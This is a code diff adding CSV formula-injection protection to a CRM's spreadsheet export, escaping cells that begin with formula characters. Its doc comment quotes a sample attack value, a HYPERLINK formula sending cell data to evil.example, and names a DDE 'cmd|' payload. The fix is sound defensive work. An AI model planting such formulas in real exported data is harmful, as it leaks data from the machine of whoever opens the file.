@@ -30,9 +30,26 @@ export async function downloadXlsx(
   XLSX.writeFile(wb, filename.endsWith('.xlsx') ? filename : `${filename}.xlsx`);
 }
 
+/**
+ * Neutralise a cell that a spreadsheet would run as a formula.
+ *
+ * Exported values come from data the CRM doesn't control — lead names, notes
+ * and comments from imports and inbound webhooks. A cell starting `=`, `@`, `+`
+ * or `-` is evaluated by Excel/Sheets when the CSV is opened, so a "business
+ * name" like `=HYPERLINK("https://evil.example?"&A1,"Click")` or a `cmd|` DDE
+ * payload runs on the manager's machine. Such cells get a leading apostrophe,
+ * which spreadsheets treat as "this is text". Plain numbers and phone numbers
+ * (`+1 813 555 0199`, `-42`) are left exactly as they are.
+ */
+export function neutraliseFormula(s: string): string {
+  if (/^[=@\t\r]/.test(s)) return `'${s}`;
+  if (/^[+-]/.test(s) && !/^[+-]?[\d\s().,-]+$/.test(s)) return `'${s}`;
+  return s;
+}
+
 function csvCell(v: unknown): string {
-  const s = v == null ? '' : String(v);
-  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  const s = neutraliseFormula(v == null ? '' : String(v));
+  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
 /** Download an array of objects as a CSV file (opens cleanly in Excel). */
